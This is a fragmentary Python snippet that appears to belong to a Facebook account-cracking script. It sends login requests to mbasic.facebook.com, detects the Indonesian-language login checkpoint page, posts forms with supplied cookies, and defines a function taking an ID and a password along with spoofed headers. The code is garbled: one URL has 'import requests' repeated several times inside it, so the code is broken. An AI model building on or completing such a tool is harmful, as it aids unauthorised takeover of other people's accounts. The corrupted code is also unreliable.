		...
		with requests.Session() as r:
			try:
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					response3 = r.post('https://mbasicimport requestsimport requestsimport requestsimport requestsimport requests.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
...
def bapi(idf,pwv):
    ...
    'referer': 'https://mbasic.facebook.com/menu/bookmarks/?ref_component=mbasic_home_header&ref_page=%2Fwap%2Fhome.php&refid=8&paipv=0&eav=AfaHXOUEVFuyxAdAkLA1QJI-7ykbkfGRZz4MWmorwBZItkN2mApOfi5f86UH0Amahck',
